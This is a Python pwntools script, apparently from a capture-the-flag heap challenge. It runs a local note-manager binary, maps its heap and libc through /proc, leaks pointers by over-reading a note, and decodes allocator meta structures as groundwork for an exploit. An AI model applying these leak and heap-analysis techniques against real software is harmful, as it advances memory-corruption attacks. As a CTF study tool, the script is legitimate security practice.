#!/usr/bin/env python3
"""
Run binary locally and inspect /proc/PID/maps + /proc/PID/mem
to understand brk heap layout and find libc pointers.
"""
from pwn import *
import struct, os

context.log_level = 'info'

BINARY = "./dist/chall"
LIBC = "./dist/libc.so"

def alloc(io, idx, sz):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"Enter size: ", str(sz).encode())

def free_note(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())

def write_note(io, idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

def read_note(io, idx, sz):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(sz).encode())
    return io.recv(sz, timeout=2)

def read_proc_mem(pid, start, size):
    try:
        with open(f"/proc/{pid}/mem", "rb") as f:
            f.seek(start)
            return f.read(size)
    except Exception as e:
        print(f"[-] Failed to read /proc/{pid}/mem: {e}")
        return b""

def parse_maps(pid):
    regions = {}
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            parts = line.split()
            addrs = parts[0].split('-')
            start = int(addrs[0], 16)
            end = int(addrs[1], 16)
            perms = parts[1]
            path = parts[5].strip() if len(parts) >= 6 else ''
            regions.setdefault('all', []).append((start, end, perms, path))

            if 'libc.so' in path and 'r-x' in perms:
                regions['libc_base'] = start
            if 'chall' in path and 'r-x' in perms:
                regions['chall_base'] = start
            if '[heap]' in path and 'rw' in perms:
                regions['heap'] = (start, end)
    return regions

def probe():
    io = process([LIBC, BINARY])
    pid = io.pid
    print(f"[*] PID: {pid}")

    # Allocate 16 notes of size 0x10
    for i in range(16):
        alloc(io, i, 0x10)
        write_note(io, i, p64(0xdead0000 + i) + p64(0xcafe0000 + i))

    # Parse maps
    regions = parse_maps(pid)
    libc_base = regions.get('libc_base')
    chall_base = regions.get('chall_base')
    heap_start, heap_end = regions.get('heap', (0, 0))

    print(f"libc_base:  0x{libc_base:x}")
    print(f"chall_base: 0x{chall_base:x}")
    print(f"chall-libc: 0x{chall_base - libc_base:x}")
    print(f"heap:       0x{heap_start:x}-0x{heap_end:x} ({heap_end-heap_start} bytes)")
    notes_addr = chall_base + 0x3020
    print(f"notes_addr: 0x{notes_addr:x}")

    # Print full maps
    print("\n=== MAPS ===")
    for start, end, perms, path in regions['all']:
        print(f"  0x{start:012x}-0x{end:012x} {perms} {path}")

    # Read brk heap
    heap_size = heap_end - heap_start
    heap_data = read_proc_mem(pid, heap_start, heap_size)

    # Scan for libc pointers on brk heap
    print(f"\n=== Libc-region pointers on brk heap ===")
    libc_ptrs_on_heap = []
    for off in range(0, len(heap_data) - 7, 8):
        val = u64(heap_data[off:off+8])
        if val == 0:
            continue
        if abs(val - libc_base) < 0x200000:
            delta = val - libc_base
            libc_ptrs_on_heap.append((off, val, delta))
            print(f"  heap+0x{off:04x}: 0x{val:x} = libc+0x{delta:x}")

    # Scan for brk self-pointers
    print(f"\n=== Brk self-pointers ===")
    for off in range(0, len(heap_data) - 7, 8):
        val = u64(heap_data[off:off+8])
        if heap_start <= val < heap_end:
            print(f"  heap+0x{off:04x}: 0x{val:x} = heap+0x{val-heap_start:x}")

    # Over-read note 14 to find leaked pointer
    leaked_data = read_note(io, 14, 0x100)
    print(f"\n=== Over-read pointers from note 14 ===")
    for off in range(0, len(leaked_data) - 7, 8):
        val = u64(leaked_data[off:off+8])
        if val > 0x10000 and val < 0x7fffffffffff:
            region = "?"
            if heap_start <= val < heap_end:
                region = f"heap+0x{val-heap_start:x}"
            elif abs(val - libc_base) < 0x200000:
                region = f"libc+0x{val-libc_base:x}"
            print(f"  +0x{off:02x}: 0x{val:x} ({region})")

    # Find the meta pointed to by the group header
    leaked_meta = None
    for off in range(0, len(leaked_data) - 7, 8):
        val = u64(leaked_data[off:off+8])
        if heap_start <= val < heap_end:
            leaked_meta = val
            break

    if leaked_meta:
        meta_off = leaked_meta - heap_start
        meta_bytes = heap_data[meta_off:meta_off+40]
        prev, next_, mem = struct.unpack('<QQQ', meta_bytes[0:24])
        avail, freed = struct.unpack('<II', meta_bytes[24:32])
        flags = struct.unpack('<Q', meta_bytes[32:40])[0]
        last_idx = flags & 0x1f
        freeable = (flags >> 5) & 1
        sizeclass = (flags >> 6) & 0x3f
        maplen = flags >> 12

        print(f"\n=== Meta at 0x{leaked_meta:x} (heap+0x{meta_off:x}) ===")
        print(f"  prev:      0x{prev:x}")
        print(f"  next:      0x{next_:x}")
        print(f"  mem:       0x{mem:x} = libc+0x{mem-libc_base:x}")
        print(f"  avail:     0x{avail:08x} = 0b{avail:032b}")
        print(f"  freed:     0x{freed:08x}")
        print(f"  last_idx:  {last_idx}")
        print(f"  freeable:  {freeable}")
        print(f"  sizeclass: {sizeclass}")
        print(f"  maplen:    {maplen}")

    # Dump ALL meta-like structures on heap
    # A meta has prev/next as brk ptrs, mem as libc ptr
    print(f"\n=== All potential metas on brk heap ===")
    for off in range(0, len(heap_data) - 40, 8):
        prev_val = u64(heap_data[off:off+8])
        next_val = u64(heap_data[off+8:off+16])
        mem_val = u64(heap_data[off+16:off+24])

        # Check if this looks like a meta: prev/next are brk ptrs or self, mem is libc ptr
        is_brk = lambda v: heap_start <= v < heap_end or v == 0
        is_libc = lambda v: abs(v - libc_base) < 0x200000 if v > 0x10000 else False

        if (is_brk(prev_val) or prev_val == heap_start + off) and \
           (is_brk(next_val) or next_val == heap_start + off) and \
           is_libc(mem_val) and mem_val != 0:
            flags = u64(heap_data[off+32:off+40])
            sc = (flags >> 6) & 0x3f
            li = flags & 0x1f
            print(f"  heap+0x{off:04x}: prev=0x{prev_val:x} next=0x{next_val:x} "
                  f"mem=libc+0x{mem_val-libc_base:x} sc={sc} last_idx={li}")

    # Read notes[] array from BSS to see where allocations actually are
    notes_data = read_proc_mem(pid, notes_addr, 16 * 16)  # 16 entries * 16 bytes
    print(f"\n=== notes[] array (at 0x{notes_addr:x}) ===")
    for i in range(16):
        data_ptr = u64(notes_data[i*16:i*16+8])
        size_val = u64(notes_data[i*16+8:i*16+16])
        if data_ptr:
            region = f"libc+0x{data_ptr-libc_base:x}" if abs(data_ptr-libc_base)<0x200000 else f"0x{data_ptr:x}"
            print(f"  notes[{i:2d}].data = 0x{data_ptr:x} ({region}), size = {size_val}")

    io.close()

if __name__ == "__main__":
    probe()
